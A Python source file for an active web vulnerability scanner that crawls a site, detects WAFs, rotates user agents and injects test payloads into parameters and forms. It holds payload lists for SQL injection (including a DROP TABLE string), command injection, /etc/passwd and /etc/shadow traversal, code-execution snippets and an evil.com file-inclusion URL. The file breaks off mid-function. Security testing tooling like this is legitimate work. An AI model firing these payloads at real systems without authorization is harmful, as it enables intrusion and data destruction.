#!/usr/bin/env python3

import argparse
import json
import logging
import re
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
import sys
import time
import threading
from pathlib import Path
from typing import Dict, List, Tuple, Set, Any
from urllib.parse import urlparse, urljoin
import random
import csv
from collections import OrderedDict

def clean_ansi(s: str) -> str:
    return ANSI_RE.sub("", s)
try:
    from colorama import init, Fore, Back, Style
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class DummyColor:
        GREEN = "\033[32m"
        RED = "\033[31m"
        YELLOW = "\033[33m"
        CYAN = "\033[36m"
        MAGENTA = "\033[35m"
        RESET_ALL = "\033[0m"
    Fore = DummyColor()
    init = lambda: None
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    class DummyTqdm:
        def __init__(self, *args, **kwargs):
            pass
        def __enter__(self):
            return self
        def __exit__(self, *args):
            pass
        def update(self, n):
            pass
    tqdm = DummyTqdm
from concurrent.futures import ThreadPoolExecutor

import requests
from requests.adapters import HTTPAdapter
from fake_useragent import UserAgent
from tabulate import tabulate
from bs4 import BeautifulSoup, SoupStrainer

# Configure logging
logger = logging.getLogger(__name__)

def setup_logging(debug: bool, log_file: str = None):
    """Configure logging with optional debug mode."""
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[logging.StreamHandler(sys.stdout)]
    )
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(level)
        file_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
        logging.getLogger().addHandler(file_handler)

class WebVulnScanner:
    """A class to scan web applications for common vulnerabilities."""
    
    def __init__(self, user_agents_file: str = "user_agents.json", request_delay: float = 1.0, custom_ua: str = None, proxy: str = None, passive: bool = False, no_verify: bool = False, vuln_file: str = None, max_requests: int = 500):
        self.ua = UserAgent()
        self.user_agents_file = user_agents_file
        self.vuln_file_path = vuln_file or "vulnerabilities.json"
        self.vulnerabilities = self.load_vulnerabilities()
        self.waf_indicators = self.load_waf_indicators()
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(pool_connections=100, pool_maxsize=100))
        self.session.mount('https://', HTTPAdapter(pool_connections=100, pool_maxsize=100))
        self.request_delay = request_delay
        self.active_payloads = {
            "Server-Side Template Injection (SSTI)": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
            "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            "Cross-Site Request Forgery (CSRF)": [],
            "Directory Traversal": ["../../etc/passwd", "../../../../etc/shadow", "../config.php", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
            "SQL Injection": ["' OR '1'='1 -- ", "'; DROP TABLE users -- ", "' AND SLEEP(5) -- ", "' OR 1=1 -- ", "1' AND '1'='1", "1' AND '1'='2"],
            "Command Injection": ["; whoami", "| whoami"],
            "Remote Code Execution": ["; id", "| uname -a"],
            "Local File Inclusion": ["../../../etc/passwd", "../../../../etc/passwd"],
            "Remote File Inclusion": ["http://evil.com/shell.txt"],
            "JWT Vulnerabilities": ["none", "HS256", "weaksecret"],
            "Deserialization": ["O:4:\"Test\":1:{s:4:\"data\";s:4:\"test\";}"],  # PHP
            "Open Redirect": ["//evil.com", "http://evil.com"]
        }
        self.confidence_scores = {
            "SQL Injection": 0.7,
            "XSS": 0.7,
            "File Inclusion": 0.6,
            "Directory Traversal": 0.6,
            "Remote File Inclusion": 0.7,
            "Command Injection": 0.7,
            "Cross-Site Request Forgery (CSRF)": 0.4,
            "Unrestricted File Upload": 0.6,
            "Password Cracking": 0.5,
            "Session Hijacking": 0.6,
            "Broken Auth and Session Management": 0.6,
            "Remote Code Execution": 0.8,
            "Local File Inclusion": 0.6,
            "Server Side Request Forgery (SSRF)": 0.7,
            "XML External Entity (XXE) Injection": 0.7,
            "Cross-Site Script Inclusion (XSSI)": 0.6,
            "Server-Side Template Injection (SSTI)": 0.8,
            "HTML Injection": 0.6,
            "XPath Injection": 0.6,
            "Code Injection": 0.7,
            "Object Injection": 0.6,
            "Cross-Domain Scripting": 0.6,
            "HTTP Response Splitting": 0.6,
            "Buffer Overflow": 0.5,
            "Format String Attack": 0.5,
            "Command Injection (Windows)": 0.6,
            "Insecure Cryptographic Storage": 0.6,
            "Insecure Direct Object References": 0.5,
            "Insufficient Logging and Monitoring": 0.5,
            "Security Misconfiguration": 0.6,
            "Cross-Site Script Inclusion (CSSI)": 0.6,
            "Click Fraud": 0.5,
            "Broken Access Control": 0.6,
            "Clickjacking": 0.5,
            "Hidden Form Fields": 0.5,
            "Shellshock": 0.7,
            "JWT Vulnerabilities": 0.7,
            "Deserialization": 0.7,
            "Open Redirect": 0.7
        }
        self.trusted_domains = [
            "youtube.com", "youtu.be", "google.com", "fonts.googleapis.com",
            "cdnjs.cloudflare.com", "fonts.gstatic.com", "googletagmanager.com",
            "cloudfront.net", "elfsight.com", "cdn.jsdelivr.net", "ajax.googleapis.com",
            "fonts.cdnfonts.com", "stackpath.bootstrapcdn.com", "use.fontawesome.com",
            "kit.fontawesome.com", "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com"
        ]
        self.context_payloads = {
            'PHP': [
                '<?php phpinfo(); ?>',
                '<?php echo shell_exec("id"); ?>',
                '<?php system("whoami"); ?>',
                '<?php passthru("ls"); ?>'
            ],
            'Node.js': [
                'require("child_process").exec("id")',
                'process.env',
                'global.process.mainModule'
            ],
            'Python': [
                '__import__("os").system("id")',
                'exec("print(1)")'
            ],
            'Java': [
                'java.lang.Runtime.getRuntime().exec("id")',
                'new java.io.FileInputStream("/etc/passwd")'
            ]
        }
        self.custom_ua = custom_ua
        self.current_user_agent = self.get_user_agent()
        self.proxy = proxy
        self.passive = passive
        self.no_verify = no_verify
        self.verify_ssl = not no_verify
        self.requests_count = 0
        self.max_requests = max_requests
        self._req_lock = threading.Lock()
        self.waf_block_counts = {}
        self.waf_lock = threading.Lock()
        self.waf_detected = False
        self._baseline_cache = {}
        self._baseline_lock = threading.Lock()
        self._detected_cms = None
        if self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}
        logger.info("Initialized with user agent: %s", self.current_user_agent)

    def _inc_requests(self, n=1):
        with self._req_lock:
            self.requests_count += n
            if self.requests_count > self.max_requests:
                raise RuntimeError("Max requests exceeded")

    def _has_db_error(self, text: str) -> bool:
        """Heuristically detect DB error messages in response text."""
        t = text.lower()
        patterns = [
            "sql syntax", "warning: mysql", "unclosed quotation mark after the character string",
            "odbc sql server driver", "psql:", "postgresql", "sqlite error", "sqlstate[", "you have an error in your sql syntax",
            "ora-", "oracle error"
        ]
        return any(p in t for p in patterns)

    def _get_baseline(self, url: str, param: str, method: str = "GET") -> str:
        """Fetch a baseline response for comparison with payload responses."""
        cache_key = (url, param, method)
        with self._baseline_lock:
            if cache_key in self._baseline_cache:
                return self._baseline_cache[cache_key]
        benign_value = "testvalue123"
        try:
            time.sleep(self.request_delay)
            proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            if method == "GET":
                resp = self.session.get(
                    f"{url}?{param}={benign_value}", timeout=5,
                    proxies=proxies, verify=self.verify_ssl
                )
            else:
                resp = self.session.post(
                    url, data={param: benign_value}, timeout=5,
                    proxies=proxies, verify=self.verify_ssl
                )
            self._inc_requests()
            text = resp.text
        except Exception:
            text = ""
        with self._baseline_lock:
            self._baseline_cache[cache_key] = text
        return text

    def _is_waf_challenge(self, response) -> bool:
        """Detect WAF challenge/block pages including JS challenges."""
        text = response.text.lower()
        status = response.status_code
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}

        if status == 403 and any(ind in text for ind in self.waf_indicators):
            return True
        if 'cf-ray' in headers_lower and status in (403, 503) and ('challenge-platform' in text or 'turnstile' in text or 'ray id' in text):
            return True
        if status == 403 and 'server' in headers_lower and any(waf in headers_lower['server'] for waf in ['cloudflare', 'sucuri', 'imperva', 'akamai']):
            return True
        challenge_signals = ['jschl-answer', 'challenge-form', '_cf_chl_opt', 'managed_checking']
        if status == 503 and any(sig in text for sig in challenge_signals):
            return True
        return False

    def load_vulnerabilities(self) -> Dict[str, Dict[str, Any]]:
        """Load vulnerability patterns from a JSON file."""
        vuln_file = Path(__file__).parent / self.vuln_file_path
        try:
            with vuln_file.open("r", encoding="utf-8") as f:
                raw_data = json.load(f)
                vulnerabilities = {}
                for name, data in raw_data.items():
                    if isinstance(data, str):
                        vulnerabilities[name] = {'pattern': data, 'detected_by': 'heuristic'}
                    elif isinstance(data, dict):
                        vulnerabilities[name] = data
                    else:
                        logger.warning("Invalid vulnerability data for %s", name)
                # Add default severity if not present
                for name, data in vulnerabilities.items():
                    if 'severity' not in data:
                        data['severity'] = 'medium'
                return vulnerabilities
        except FileNotFoundError:
            logger.error("Vulnerability file not found: %s", vuln_file)
            sys.exit(1)
        except json.JSONDecodeError as e:
            logger.error("Invalid JSON in vulnerabilities file: %s", e)
            sys.exit(1)

    def load_waf_indicators(self) -> List[str]:
        """Load WAF indicators from a JSON file."""
        waf_file = Path(__file__).parent / "waf_indicators.json"
        default_indicators = ["access denied", "firewall", "sucuri", "block id", "cloudflare", "waf", "forbidden", "akamai", "imperva", "f5", "barracuda", "mod_security", "stackpath", "distil", "incapsula"]
        if waf_file.exists():
            try:
                with waf_file.open("r", encoding="utf-8") as f:
                    indicators = json.load(f)
                    if isinstance(indicators, list):
                        return default_indicators + indicators
                    logger.warning("Invalid format in waf_indicators.json, using defaults")
            except (FileNotFoundError, json.JSONDecodeError) as e:
                logger.warning("Failed to load waf_indicators.json: %s", e)
        return default_indicators

    def validate_input(self, target: str, base_url: str = None) -> Tuple[bool, str]:
        """Validate if the input is a valid URL or IP address, and normalize it."""
        url_pattern = r"^(https?://)?([a-zA-Z0-9.-]+)(:[0-9]+)?(/.*)?$"
        ip_pattern = r"^(([0-9]{1,3}\.){3}[0-9]{1,3})(:[0-9]+)?(/.*)?$"
        relative_pattern = r"^(/[a-zA-Z0-9_.-]+)+/?$"

        if base_url and re.match(relative_pattern, target):
            normalized_target = urljoin(base_url, target)
            return True, normalized_target

        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        
        if re.match(url_pattern, target) or re.match(ip_pattern, target):
            return True, target
        return False, target

    def get_user_agent(self) -> str:
        """Get a random user agent from file or fake-useragent."""
        if self.custom_ua:
            return self.custom_ua
        user_agents_file = Path(__file__).parent / self.user_agents_file
        if user_agents_file.exists():
            try:
                with user_agents_file.open("r", encoding="utf-8") as f:
                    user_agents = json.load(f)
                    if isinstance(user_agents, list) and user_agents:
                        return random.choice(user_agents)
            except (json.JSONDecodeError, IOError) as e:
                logger.warning("Failed to load user agents from %s: %s", user_agents_file, e)
        return self.ua.random

    def scan_target(self, target: str, base_url: str = None) -> Tuple[int, str, str, Dict]:
        """Fetch the target URL and return HTTP status code, response text, failed URL, and headers."""
        is_valid, normalized_target = self.validate_input(target, base_url)
        if not is_valid:
            return 0, "", target, {}

        headers = {"User-Agent": self.current_user_agent}
        try:
            time.sleep(self.request_delay)
            response = self.session.get(
                normalized_target, headers=headers, timeout=10, verify=self.verify_ssl
            )
            self._inc_requests()
            return response.status_code, response.text, None, response.headers
        except requests.exceptions.SSLError as e:
            logger.debug("SSL verification failed for %s: %s", normalized_target, e)
            return 0, "", normalized_target, {}
        except requests.exceptions.RequestException as e:
            logger.debug("Failed to connect to %s: %s", normalized_target, e)
            self.current_user_agent = self.get_user_agent()
            logger.debug("Rotated user agent to: %s", self.current_user_agent)
            return 0, "", normalized_target, {}

    def is_waf_response(self, text: str) -> bool:
        """Check if the response is from a WAF block page (requires multiple signals)."""
        text_lower = text.lower() if not text.islower() else text
        indicator_count = sum(1 for ind in self.waf_indicators if ind in text_lower)
        if indicator_count >= 3:
            return True
        if indicator_count >= 1 and len(text) < 5000:
            return True
        return False

    @staticmethod
    def _build_poc(method: str, url: str, payload: str, param: str = None, evidence: str = "") -> Dict[str, str]:
        """Build a PoC reproduction dict for a finding."""
        from urllib.parse import quote
        poc = {'method': method, 'url': url, 'payload': payload, 'evidence': evidence}
        if method == "GET":
            poc['curl'] = f'curl -s -o /dev/null -w "%{{http_code}}" "{url}"'
            poc['browser'] = url
            poc['reproduce'] = f'Visit {url} in a browser and look for: {evidence}'
        else:
            poc['curl'] = f'curl -s -X POST -d "{param}={quote(payload)}" "{url}"'
            poc['reproduce'] = f'POST to {url} with {param}={payload} and look for: {evidence}'
        return poc

    def _handle_response(self, name: str, response, payload: str, method: str, target: str, baseline_text: str = "", param: str = "") -> List[Tuple]:
        """Handle response for a specific vulnerability with baseline comparison."""
        matches = []
        text = response.text
        text_lower = text.lower()
        req_url = response.url

        if self._is_waf_challenge(response) or self.is_waf_response(text_lower):
            with self.waf_lock:
                self.waf_block_counts[name] = self.waf_block_counts.get(name, 0) + 1
            logger.debug("WAF blocked %s test: %s %s", name, method, response.url)
            return matches

        def _add(desc, conf, evidence=""):
            poc = self._build_poc(method, req_url, payload, param, evidence or desc)
            matches.append((text[:120], desc, conf, "Active", poc))

        if name == "Server-Side Template Injection (SSTI)":
            # CMS platforms that do NOT evaluate arbitrary template expressions from user input.
            # SSTI requires a raw template engine (Jinja2, Twig, Mako, etc.) exposed to user input.
            # Standard CMS platforms sanitize or ignore template-like syntax in user queries.
            cms_not_ssti_vulnerable = {
                'MediaWiki', 'WordPress', 'Joomla', 'Drupal', 'Shopify', 'Wix',
                'Squarespace', 'Ghost', 'Blogger', 'Moodle', 'OpenCart', 'PrestaShop',
            }
            ssti_markers = {"{{7*7}}": "49", "${7*7}": "49", "<%=7*7%>": "49"}
            expected = ssti_markers.get(payload)
            if expected and expected in text:
                if self._detected_cms in cms_not_ssti_vulnerable:
                    logger.debug("SSTI suppressed: %s does not evaluate user-controlled template expressions", self._detected_cms)
                else:
                    is_search_page = any(s in text_lower for s in ['search results', 'searchresults', 'no results', 'did you mean'])
                    if is_search_page:
                        logger.debug("SSTI suppressed: search page naturally contains short numeric strings")
                    else:
                        in_baseline = expected in baseline_text if baseline_text else False
                        if not in_baseline:
                            idx = text.find(expected)
                            context_window = text[max(0, idx - 30):idx + len(expected) + 30]
                            if payload not in context_window:
                                _add(f"Active SSTI test: {payload} evaluated to {expected} (not in baseline)", 0.9, f'"{expected}" appears without raw payload nearby')
                            else:
                                _add(f"Active SSTI test: {payload} -> {expected} (reflected near payload, suspected)", 0.5, f'"{expected}" near raw payload')

        elif name == "XSS":
            if payload in text:
                in_baseline = payload in baseline_text if baseline_text else False
                if not in_baseline:
                    from html import escape as html_escape
                    escaped_payload = html_escape(payload)
                    if escaped_payload in text and payload not in text.replace(escaped_payload, ''):
                        _add(f"Active XSS test: {payload} reflected but HTML-escaped", 0.2, f'escaped payload in response')
                    else:
                        idx = text.find(payload)
                        surrounding = text[max(0, idx - 50):idx + len(payload) + 50].lower()
                        in_attr = any(ctx in surrounding for ctx in ['value="', "value='", 'placeholder="', 'title="'])
                        in_tag_context = '<' in text[max(0, idx - 5):idx]
                        if in_tag_context or not in_attr:
                            _add(f"Active XSS test: {payload} reflected unescaped in HTML context", 0.8, f'raw payload in HTML body')
                        else:
                            _add(f"Active XSS test: {payload} reflected in attribute (suspected)", 0.5, f'payload in attribute value')

        elif name == "SQL Injection":
            has_error = self._has_db_error(text)
            baseline_has_error = self._has_db_error(baseline_text) if baseline_text else False
            is_search = any(s in text_lower for s in ['search results', 'searchresults', 'no results', 'did you mean', 'showing results'])
            if has_error and not baseline_has_error:
                _add(f"Active SQLi test: {payload} caused database error (HTTP {response.status_code})", 0.85, f'DB error string in response (absent from baseline)')
            elif response.status_code >= 500 and baseline_text:
                _add(f"Active SQLi test: {payload} caused server error (HTTP {response.status_code})", 0.6, f'HTTP {response.status_code} vs baseline 200')
            if baseline_text and not has_error and not is_search:
                baseline_len = len(baseline_text)
                response_len = len(text)
                if baseline_len > 0:
                    diff_ratio = abs(response_len - baseline_len) / baseline_len
                    if diff_ratio > 0.5 and response.status_code == 200:
                        _add(f"Active SQLi test: {payload} caused significant response size change ({diff_ratio:.0%})", 0.35, f'response {response_len} bytes vs baseline {baseline_len} bytes')

        elif name in ["Command Injection", "Remote Code Execution"]:
            cmd_patterns = [
                (r'uid=\d+\(\w+\)\s+gid=\d+', 'uid= output detected'),
                (r'root:x:0:0:', '/etc/passwd content leaked'),
                (r'(?:Linux|Darwin|SunOS)\s+\S+\s+\d+\.\d+', 'uname output detected'),
            ]
            for pattern, description in cmd_patterns:
                if re.search(pattern, text):
                    in_baseline = bool(re.search(pattern, baseline_text)) if baseline_text else False
                    if not in_baseline:
                        _add(f"Active {name} test: {payload} - {description}", 0.9, f'regex /{pattern}/ matched in response')

        elif name in ["Local File Inclusion", "Remote File Inclusion"]:
            passwd_pattern = r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:'
            has_passwd_struct = bool(re.search(passwd_pattern, text, re.MULTILINE))
            in_baseline = bool(re.search(passwd_pattern, baseline_text, re.MULTILINE)) if baseline_text else False
            if has_passwd_struct and not in_baseline:
                _add(f"Active {name} test: {payload} exposed /etc/passwd structure", 0.9, f'/etc/passwd format lines in response')
            win_patterns = [
                r'\[boot loader\]',
                r'\[operating systems\]',
                r'\[extensions\]',
            ]
            for wp in win_patterns:
                if re.search(wp, text, re.IGNORECASE):
                    in_base = bool(re.search(wp, baseline_text, re.IGNORECASE)) if baseline_text else False
                    if not in_base:
                        _add(f"Active {name} test: {payload} exposed Windows system file", 0.85, f'Windows INI structure in response')
                        break

        elif name == "JWT Vulnerabilities" and 'eyJ' in text:
            in_baseline = 'eyJ' in baseline_text if baseline_text else False
            if not in_baseline:
                _add(f"Active JWT test: Potential weak token with {payload}", 0.7, f'"eyJ" (base64 JWT header) in response')

        elif name == "Deserialization":
            deser_patterns = [
                r'warning: unserialize\(',
                r'fatal error:.*unserialize',
                r'call stack.*unserialize'
            ]
            has_error = any(re.search(p, text_lower) for p in deser_patterns)
            baseline_has_error = any(re.search(p, baseline_text.lower()) for p in deser_patterns) if baseline_text else False
            if has_error and not baseline_has_error and response.status_code >= 400:
                _add(f"Active Deserialization test: {payload} triggered unserialize error", 0.75, f'PHP unserialize error in response')

        elif name == "Open Redirect":
            original_host = urlparse(target).netloc
            final_host = urlparse(response.url).netloc
            was_redirect = any(300 <= r.status_code < 400 for r in response.history)
            host_changed = final_host != original_host
            evil_in_target = 'evil.com' in final_host.lower()
            if was_redirect and host_changed and evil_in_target:
                location = response.history[-1].headers.get('Location', '') if response.history else ''
                _add(f"Active Open Redirect test: {payload} redirected via {location}", 0.85, f'redirected to {final_host}')

        return matches

    def _test_post_forms(self, target: str, soup: BeautifulSoup, payloads: List[str], name: str) -> List[Tuple[str, str, float, str]]:
        """Test payloads via POST to forms with baseline comparison."""
        matches = []
        for form in soup.find_all('form')[:2]:
            action = form.get('action') or ''
            if not action.startswith(('http://', 'https://')):
                action = urljoin(target, action)
            params = [
                inp.get('name') for inp in form.find_all('input')
                if inp.get('name') and inp.get('type') not in ['hidden', 'submit']
            ]
            if not params:
                continue
            target_param = params[0]
            base_inputs = {p: "test" for p in params}
            baseline_text = self._get_baseline(action, target_param, "POST")
            for payload in payloads[:3]:
                inputs = base_inputs.copy()
                inputs[target_param] = payload
                try:
                    time.sleep(self.request_delay)
                    response = requests.post(action, data=inputs, timeout=5, proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None, verify=self.verify_ssl)
                    self._inc_requests()
                    logger.debug("Active %s test: POST %s with %s, Response: %s", name, action, inputs, response.text[:200])
                    matches.extend(self._handle_response(name, response, payload, "POST", target, baseline_text, target_param))
                except requests.RequestException as e:
                    logger.debug("Active %s test failed: %s", name, e)
        return matches

    def _extract_params_from_pages(self, pages: List[Tuple[str, int, str, Dict]]) -> Set[str]:
        """Extract real parameter names from crawled URLs and forms."""
        params = set()
        for url, _, content, _ in pages:
            parsed = urlparse(url)
            if parsed.query:
                for part in parsed.query.split('&'):
                    if '=' in part:
                        params.add(part.split('=', 1)[0])
            soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer(['form', 'a']))
            for a in soup.find_all('a', href=True):
                href = a['href']
                if '?' in href:
                    query = href.split('?', 1)[1]
                    for part in query.split('&'):
                        if '=' in part:
                            params.add(part.split('=', 1)[0])
            for form in soup.find_all('form'):
                for inp in form.find_all(['input', 'select', 'textarea']):
                    n = inp.get('name')
                    if n and inp.get('type') not in ['hidden', 'submit', 'button']:
                        params.add(n)
        return params

    def _test_get_params(self, target: str, payloads: List[str], name: str, extra_params: Set[str] = None) -> List[Tuple[str, str, float, str]]:
        """Test payloads via GET parameters with baseline comparison."""
        matches = []
        search_params = {'q', 'query', 'search', 's', 'keyword', 'term'}
        # CMS framework params that are not user-injectable — they control routing/rendering, not DB queries
        framework_params = {
            'redlink', 'action', 'title', 'oldid', 'diff', 'curid', 'returnto',
            'type', 'limit', 'offset', 'sort', 'order', 'from', 'token',
            'wpEditToken', 'wpSave', 'wpPreview',
        }
        common_params = ['q', 'id']
        if extra_params:
            common_params = list(dict.fromkeys(common_params + sorted(extra_params)))[:8]
        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        for param in common_params:
            if param.lower() in framework_params:
                logger.debug("Skipping framework param '%s' — not user-injectable", param)
                continue
            baseline_text = self._get_baseline(target, param, "GET")
            for payload in payloads[:5]:
                test_url = f"{target}?{param}={payload}"
                try:
                    time.sleep(self.request_delay)
                    is_time_based = 'SLEEP(' in payload.upper() or 'WAITFOR' in payload.upper() or 'PG_SLEEP' in payload.upper()
                    timeout = 15 if is_time_based else 5
                    start_t = time.time()
                    response = requests.get(test_url, timeout=timeout, proxies=proxies, verify=self.verify_ssl)
                    elapsed = time.time() - start_t
                    self._inc_requests()
                    logger.debug("Active %s test: GET %s, Response: %s (%.2fs)", name, test_url, response.text[:200], elapsed)
                    matches.extend(self._handle_response(name, response, payload, "GET", target, baseline_text, param))
                    if name == "SQL Injection" and is_time_based and elapsed >= 4.5:
                        # Confirmation: measure a control request (no SLEEP) to establish baseline latency
                        control_payload = payload.upper().replace('SLEEP(5)', 'SLEEP(0)').replace('WAITFOR DELAY', 'WAITFOR DELAY \'00:00:00\' --NOOP')
                        control_url = f"{target}?{param}={control_payload}"
                        try:
                            time.sleep(self.request_delay)
                            ctrl_start = time.time()
                            requests.get(control_url, timeout=10, proxies=proxies, verify=self.verify_ssl)
                            ctrl_elapsed = time.time() - ctrl_start
                            self._inc_requests()
                        except Exception:
                            ctrl_elapsed = elapsed
                        # Also repeat the original payload to confirm consistency
                        try:
                            time.sleep(self.request_delay)
                            confirm_start = time.time()
                            requests.get(test_url, timeout=15, proxies=proxies, verify=self.verify_ssl)
                            confirm_elapsed = time.time() - confirm_start
                            self._inc_requests()
                        except Exception:
                            confirm_elapsed = 0
                        delay_above_control = elapsed - ctrl_elapsed
                        confirm_above_control = confirm_elapsed - ctrl_elapsed
                        logger.debug("Time-based SQLi check: initial=%.1fs, control=%.1fs, confirm=%.1fs, delta=%.1fs", elapsed, ctrl_elapsed, confirm_elapsed, delay_above_control)
                        if delay_above_control >= 3.5 and confirm_above_control >= 3.5:
                            poc = self._build_poc("GET", test_url, payload, param, f"delay {elapsed:.1f}s vs control {ctrl_elapsed:.1f}s, confirmed {confirm_elapsed:.1f}s")
                            matches.append((response.text[:120], f"Active SQLi test: {payload} caused consistent {delay_above_control:.1f}s delay above control (confirmed)", 0.85, "Active", poc))
                        elif delay_above_control >= 3.5:
                            logger.debug("Time-based SQLi: initial delay but confirmation failed (control=%.1fs, confirm=%.1fs)", ctrl_elapsed, confirm_elapsed)
                    if name == "SQL Injection" and baseline_text and not is_time_based:
                        resp_lower = response.text.lower()
                        is_search_param = param.lower() in search_params
                        is_search = is_search_param or any(s in resp_lower for s in ['search results', 'searchresults', 'no results', 'did you mean', 'showing results'])
                        if not is_search:
                            true_cond = "1'='1" in payload or "1=1" in payload
                            false_cond = "1'='2" in payload or "1=2" in payload
                            if true_cond and len(response.text) != len(baseline_text):
                                logger.debug("Boolean SQLi candidate (true): response differs from baseline by %d chars", abs(len(response.text) - len(baseline_text)))
                            if false_cond and abs(len(response.text) - len(baseline_text)) > len(baseline_text) * 0.15:
                                poc = self._build_poc("GET", test_url, payload, param, f"response size {len(response.text)} vs baseline {len(baseline_text)}")
                                matches.append((response.text[:120], f"Active SQLi test: {payload} boolean-based response differs from baseline", 0.4, "Active", poc))
                except requests.exceptions.Timeout:
                    if name == "SQL Injection" and ('SLEEP(' in payload.upper() or 'WAITFOR' in payload.upper()):
                        # Timeout alone is not proof — could be WAF/network. Send a control to check.
                        try:
                            time.sleep(self.request_delay)
                            ctrl_url = f"{target}?{param}=testvalue123"
                            ctrl_start = time.time()
                            requests.get(ctrl_url, timeout=10, proxies=proxies, verify=self.verify_ssl)
                            ctrl_elapsed = time.time() - ctrl_start
                            self._inc_requests()
                            if ctrl_elapsed < 5:
                                poc = self._build_poc("GET", test_url, payload, param, f"payload timed out but control responded in {ctrl_elapsed:.1f}s")
                                matches.append(("", f"Active SQLi test: {payload} caused timeout, control responded in {ctrl_elapsed:.1f}s (suspected time-based blind)", 0.6, "Active", poc))
                            else:
                                logger.debug("Time-based SQLi timeout: control also slow (%.1fs), likely network/WAF", ctrl_elapsed)
                        except Exception:
                            logger.debug("Time-based SQLi timeout: control request also failed, likely network issue")
                except requests.RequestException as e:
                    logger.debug("Active %s test failed: %s", name, e)
        return matches

    def detect_waf(self, target: str) -> bool:
        """Perform a pre-scan to detect WAF presence."""
        is_valid, normalized_target = self.validate_input(target)
        if not is_valid:
            logger.warning("Invalid target for WAF detection: %s", target)
            return False

        test_url = f"{normalized_target}?test=../../etc/passwd"
        headers = {"User-Agent": self.current_user_agent}
        try:
            time.sleep(self.request_delay)
            response = self.session.get(test_url, timeout=5, verify=self.verify_ssl, headers=headers)
            self._inc_requests()
            logger.debug("WAF pre-scan: GET %s, Response: %s", test_url, response.text[:200])
            if self.is_waf_response(response.text):
                logger.warning("WAF detected at %s", target)
                return True
            return False
        except requests.RequestException as e:
            logger.debug("WAF pre-scan failed: %s", e)
            return False

    def crawl_pages(self, target: str, max_pages: int = 5) -> List[Tuple[str, int, str, Dict]]:
        """Crawl linked pages up to a maximum limit."""
        is_valid, normalized_target = self.validate_input(target)
        if not is_valid:
            logger.error("Invalid target URL: %s", target)
            sys.exit(1)

        results = []
        visited: Set[str] = set()
        to_visit = [normalized_target]
        domain = urlparse(normalized_target).netloc
        invalid_urls: Set[str] = set()

        common_paths = [
            "/dashboard", "/admin", "/settings", "/api", "/logout",
            "/admin/index.php", "/admin/settings.php", "/admin/api",
            "/admin/queries.php", "/admin/groups.php", "/admin/dns_records.php"
        ]
        for path in common_paths:
            full_url = urljoin(normalized_target, path)
            is_valid, full_url = self.validate_input(full_url, normalized_target)
            if is_valid and full_url not in to_visit and full_url not in visited:
                to_visit.append(full_url)
            elif not is_valid:
                invalid_urls.add(full_url)

        if HAS_TQDM:
            pbar = tqdm(total=max_pages, desc="Crawling pages")
        else:
            pbar = None
        while to_visit and len(visited) < max_pages:
            current_url = to_visit.pop(0)
            is_valid, current_url = self.validate_input(current_url, normalized_target)
            if not is_valid or current_url in visited:
                if not is_valid:
                    invalid_urls.add(current_url)
                continue

            status_code, content, failed_url, headers = self.scan_target(current_url, base_url=normalized_target)
            if failed_url:
                invalid_urls.add(failed_url)
                continue
            if status_code != 200:
                logger.debug("Skipping %s (HTTP %d)", current_url, status_code)
                continue

            results.append((current_url, status_code, content, headers))
            visited.add(current_url)
            if pbar:
                pbar.update(1)

            soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer('a'))
            links = [
                urljoin(current_url, a.get('href'))
                for a in soup.find_all('a', href=True)
                if urlparse(urljoin(current_url, a.get('href'))).netloc == domain
            ]

            js_soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer('script'))
            for script in js_soup.find_all('script'):
                if script.string:
                    routes = re.findall(r'[\'"](/[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+/?)[\'"]', script.string)
                    for route in routes:
                        full_url = urljoin(normalized_target, route)
                        is_valid, full_url = self.validate_input(full_url, normalized_target)
                        if is_valid and not re.match(r'^https?://[a-zA-Z0-9_-]+$', full_url) and full_url not in visited and full_url not in to_visit:
                            to_visit.append(full_url)
                        elif not is_valid:
                            invalid_urls.add(full_url)

            for link in links:
                is_valid, link = self.validate_input(link, normalized_target)
                if is_valid and link not in visited and link not in to_visit and len(visited) + len(to_visit) < max_pages:
                    to_visit.append(link)
                elif not is_valid:
                    invalid_urls.add(link)

        if pbar:
            pbar.close()
        logger.info("Crawled %d pages: %s", len(results), ", ".join(visited))
        if invalid_urls:
            logger.warning("Skipped %d invalid URLs: %s", len(invalid_urls), ", ".join(sorted(invalid_urls)[:5]) + ("..." if len(invalid_urls) > 5 else ""))
        return results

    def active_scan(self, target: str, soup: BeautifulSoup, name: str, headers: Dict[str, str], discovered_params: Set[str] = None) -> List[Tuple[str, str, float, str]]:
        """Perform active scanning by injecting payloads and analyzing responses."""
        matches = []
        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        parsed_url = urlparse(target)
        domain = parsed_url.netloc or parsed_url.path
        if not domain:
            logger.warning("Invalid target URL for active scanning: %s", target)
            return matches
        normalized_target = f"https://{domain}" if not target.startswith(("http://", "https://")) else target
        
        if self.waf_detected and name == "Directory Traversal":
            logger.warning("Skipping active %s tests due to WAF detection", name)
            return matches

        # Detect context from headers
        x_powered = headers.get('X-Powered-By', '').lower()
        server = headers.get('Server', '').lower()
        context = 'general'
        if 'php' in x_powered:
            context = 'PHP'
        elif 'node' in x_powered or 'node.js' in x_powered:
